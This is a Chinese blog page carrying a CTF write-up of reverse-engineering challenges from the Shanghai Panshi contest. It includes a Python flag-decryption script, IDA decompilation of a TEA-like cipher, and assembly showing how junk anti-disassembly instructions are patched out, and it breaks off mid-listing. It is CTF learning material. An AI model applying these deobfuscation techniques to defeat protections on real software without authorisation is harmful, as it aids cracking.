<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="linkpwn的学习经历">
<meta property="og:type" content="website">
<meta property="og:title" content="网络幻影">
<meta property="og:url" content="http://linkpwn.github.io/page/2/index.html">
<meta property="og:site_name" content="网络幻影">
<meta property="og:description" content="linkpwn的学习经历">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="linkpwn">
<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://linkpwn.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>网络幻影</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta custom-logo">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">网络幻影</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
      <a>
        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
      </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            

	<div class="tag-cloud">
	  <div class="tag-cloud-tags" id="tags">
		
	  </div>
	</div>
	<br>
	
	<script type="text/javascript">
     var alltags = document.getElementsByClassName('tag-cloud-tags');
     var tags = alltags[0].getElementsByTagName('a');
     for (var i = tags.length - 1; i >= 0; i--) {
       var r=Math.floor(Math.random()*75+130);
       var g=Math.floor(Math.random()*75+100);
       var b=Math.floor(Math.random()*75+80);
       tags[i].style.background = "rgb("+r+","+g+","+b+")";
     }
</script>

<style>
  .tag-cloud-tags{
    /*font-family: Helvetica, Tahoma, Arial;*/
    /*font-weight: 100;*/
    text-align: center;
    counter-reset: tags;
  }
  .tag-cloud-tags a{
    border-radius: 6px;
    padding-right: 5px;
    padding-left: 5px;
    margin: 8px 5px 0px 0px;
  }
  .tag-cloud-tags a:before{
    content: "?";
  }

  .tag-cloud-tags a:hover{
     box-shadow: 0px 5px 15px 0px rgba(0,0,0,.4);
     transform: scale(1.1);
     /*box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);*/
     transition-duration: 0.15s;
  }
</style>

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/07/%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3re%E5%92%8Cpwn%E9%83%A8%E5%88%86wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/07/%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3re%E5%92%8Cpwn%E9%83%A8%E5%88%86wp/" class="post-title-link" itemprop="url">上海磐石re和pwn部分wp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-07 21:17:16" itemprop="dateCreated datePublished" datetime="2025-08-07T21:17:16+08:00">2025-08-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-08-08 23:48:33" itemprop="dateModified" datetime="2025-08-08T23:48:33+08:00">2025-08-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="EasyRE"><a href="#EasyRE" class="headerlink" title="EasyRE"></a>EasyRE</h2><p>ai一把出直接给exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unxor_chain</span>(<span class="params">data</span>):</span><br><span class="line">    temp = [<span class="number">0</span>] * <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            temp[i] = data[i] ^ <span class="number">0x42</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp[i] = (data[i] ^ data[i-<span class="number">1</span>]) ^ <span class="number">0x42</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_sbox</span>():</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] - <span class="number">7</span>*(i//<span class="number">7</span>) + i + <span class="number">4919</span>) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">target</span>):</span><br><span class="line">    temp_v24 = unxor_chain(target)</span><br><span class="line">    s = generate_sbox()  <span class="comment"># 固定 s-box</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    flag = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp_v24)):</span><br><span class="line">        <span class="comment"># Step 1: i = (i + 1) % 256</span></span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 2: j 更新</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            j = (j + s[<span class="number">3</span> * i % <span class="number">256</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (j + s[i]) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 3: 交换 s[i] 和 s[j]</span></span><br><span class="line">        old_si = s[i]</span><br><span class="line">        old_sj = s[j]</span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 4: 计算 index = (old_s[i] + new_s[i]) &amp; 0xFF = (old_si + s[i]) &amp; 0xFF</span></span><br><span class="line">        index = (old_si + s[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        ks = s[index]  <span class="comment"># keystream byte</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 5: bias = (i * j) % 16</span></span><br><span class="line">        bias = (i * j) % <span class="number">16</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 6: temp_v24[idx] = rol( bias + (flag_char ^ ks), 3 )</span></span><br><span class="line">        decrypted_val = ror(temp_v24[idx], <span class="number">3</span>)  <span class="comment"># ror by 3</span></span><br><span class="line">        <span class="comment"># =&gt; bias + (flag_char ^ ks) = decrypted_val</span></span><br><span class="line">        xor_val = decrypted_val - bias</span><br><span class="line">        xor_val &amp;= <span class="number">0xFF</span>  <span class="comment"># 模 256</span></span><br><span class="line"></span><br><span class="line">        flag_char = xor_val ^ ks</span><br><span class="line">        flag.append(flag_char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(flag).decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标数据</span></span><br><span class="line">target = [</span><br><span class="line">    <span class="number">0x93</span>, <span class="number">0xF9</span>, <span class="number">0x8D</span>, <span class="number">0x92</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0xD9</span>, <span class="number">0x05</span>, <span class="number">0xC6</span>, <span class="number">0x0A</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xDB</span>, <span class="number">0x4F</span>, <span class="number">0xCB</span>, <span class="number">0xD8</span>, <span class="number">0x5D</span>, <span class="number">0xA6</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0x95</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0xE7</span>, <span class="number">0x9A</span>, <span class="number">0x37</span>, <span class="number">0x72</span>, <span class="number">0x4D</span>, <span class="number">0xEF</span>, <span class="number">0x57</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = decrypt_flag(target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>





<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(main, v4, &amp;retaddr, init, fini, a3, &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>点击main，发现有花指令，改一下</p>
<p>先给出修改好的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">1452940357</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">-282301936</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">-79426602</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">1469576221</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">1379922627</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="number">1211333849</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="number">907455533</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="number">112603437</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pls input flag&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">  sub_55A7A6AAA1A9((<span class="type">unsigned</span> <span class="type">int</span> *)buf, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7[i] != *(_DWORD *)(<span class="number">4LL</span> * i + v3) || v7[<span class="number">2</span> * i + <span class="number">1</span>] != *(_DWORD *)(<span class="number">4</span> * (<span class="number">2</span> * i + <span class="number">1LL</span>) + v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_55A7A6AAA1A9</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a1[<span class="number">2</span> * i];</span><br><span class="line">    v4 = a1[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x1F</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 -= <span class="number">1988930350</span>;</span><br><span class="line">      v3 += v5 ^ (v4 + v5) ^ (<span class="number">16</span> * v4 + *a2) ^ ((v4 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]);</span><br><span class="line">      v4 += v5 ^ (v3 + v5) ^ (<span class="number">16</span> * v3 + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    a1[<span class="number">2</span> * i] = v3;</span><br><span class="line">    a1[<span class="number">2</span> * i + <span class="number">1</span>] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是改好的</p>
<p>现在来说怎么改,点击进来时你可以发现都是没定义的，直接改patch根本不行，我就先用kali远程调试了一下，让数据重新加载了一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001308 main:                                   ; DATA XREF: start+21↑o</span><br><span class="line">.text:0000000000001308 ; __unwind &#123;</span><br><span class="line">.text:0000000000001308                 endbr64</span><br><span class="line">.text:000000000000130C                 push    rbp</span><br><span class="line">.text:000000000000130D                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001310                 sub     rsp, 70h</span><br><span class="line">.text:0000000000001314                 mov     rax, fs:28h</span><br><span class="line">.text:000000000000131D                 mov     [rbp-8], rax</span><br><span class="line">.text:0000000000001321                 xor     eax, eax</span><br><span class="line">.text:0000000000001323                 mov     dword ptr [rbp-60h], 2</span><br><span class="line">.text:000000000000132A</span><br><span class="line">.text:000000000000132A loc_132A:                               ; CODE XREF: .text:loc_1363↓j</span><br><span class="line">.text:000000000000132A                 mov     dword ptr [rbp-5Ch], 0</span><br><span class="line">.text:0000000000001331                 mov     dword ptr [rbp-58h], 2</span><br><span class="line">.text:0000000000001338                 mov     dword ptr [rbp-54h], 2</span><br><span class="line">.text:000000000000133F                 mov     qword ptr [rbp-30h], 0</span><br><span class="line">.text:0000000000001347                 mov     qword ptr [rbp-28h], 0</span><br><span class="line">.text:000000000000134F                 mov     qword ptr [rbp-20h], 0</span><br><span class="line">.text:0000000000001357                 mov     qword ptr [rbp-18h], 0</span><br><span class="line">.text:000000000000135F                 jz      short near ptr loc_1363+1</span><br><span class="line">.text:0000000000001361                 jnz     short near ptr loc_1363+1</span><br><span class="line">.text:0000000000001363</span><br><span class="line">.text:0000000000001363 loc_1363:                               ; CODE XREF: .text:000000000000135F↑j</span><br><span class="line">.text:0000000000001363                                         ; .text:0000000000001361↑j</span><br><span class="line">.text:0000000000001363                 loope   near ptr loc_132A+2</span><br><span class="line">.text:0000000000001365                 mov     r8b, 45h ; &#x27;E&#x27;</span><br><span class="line">.text:0000000000001368                 sbb     al, 9Ah</span><br><span class="line">.text:000000000000136A                 push    rsi</span><br><span class="line">.text:000000000000136B                 mov     dword ptr [rbp-4Ch], 0EF2C6A10h</span><br><span class="line">.text:0000000000001372                 mov     dword ptr [rbp-48h], 0FB440BD6h</span><br><span class="line">.text:0000000000001379                 mov     dword ptr [rbp-44h], 5797F41Dh</span><br><span class="line">.text:0000000000001380                 mov     dword ptr [rbp-40h], 523FF2C3h</span><br><span class="line">.text:0000000000001387                 mov     dword ptr [rbp-3Ch], 48337CD9h</span><br><span class="line">.text:000000000000138E                 mov     dword ptr [rbp-38h], 3616AC2Dh</span><br><span class="line">.text:0000000000001395                 mov     dword ptr [rbp-34h], 6B6312Dh</span><br><span class="line">.text:000000000000139C                 lea     rdi, aPlsInputFlag ; &quot;Pls input flag&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011A9 loc_11A9:                               ; CODE XREF: .text:00000000000013D1↓p</span><br><span class="line">.text:00000000000011A9 ; __unwind &#123;</span><br><span class="line">.text:00000000000011A9                 endbr64</span><br><span class="line">.text:00000000000011AD                 push    rbp</span><br><span class="line">.text:00000000000011AE                 mov     rbp, rsp</span><br><span class="line">.text:00000000000011B1                 mov     [rbp-38h], rdi</span><br><span class="line">.text:00000000000011B5                 mov     [rbp-40h], rsi</span><br><span class="line">.text:00000000000011B9                 jz      short near ptr loc_11BD+1</span><br><span class="line">.text:00000000000011BB                 jnz     short near ptr loc_11BD+1</span><br><span class="line">.text:00000000000011BD</span><br><span class="line">.text:00000000000011BD loc_11BD:                               ; CODE XREF: .text:00000000000011B9↑j</span><br><span class="line">.text:00000000000011BD                                         ; .text:00000000000011BB↑j</span><br><span class="line">.text:00000000000011BD                 loope   near ptr loc_1182+4</span><br><span class="line">.text:00000000000011BF                 db      45h</span><br><span class="line">.text:00000000000011BF                 fadd    dword ptr [r8]</span><br><span class="line">.text:00000000000011BF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011C2                 dw 0</span><br><span class="line">.text:00000000000011C4                 dd 12EE900h</span><br><span class="line">.text:00000000000011C8                 dq 48C001D8458B0000h, 85148D4898h, 0D00148C8458B4800h</span><br><span class="line">.text:00000000000011E0                 dq 0D8458BDC4589008Bh, 1C083489848C001h, 85148D48h, 8BD00148C8458B48h</span><br><span class="line">.text:0000000000001200                 dq 0E445C7E0458900h, 54D2EC45C7000000h, 8BC0458B488973h</span><br><span class="line">.text:0000000000001218                 dq 8BC0458B48F04589h, 458B48F445890440h, 48F8458908408BC0h</span><br><span class="line">.text:0000000000001230                 dq 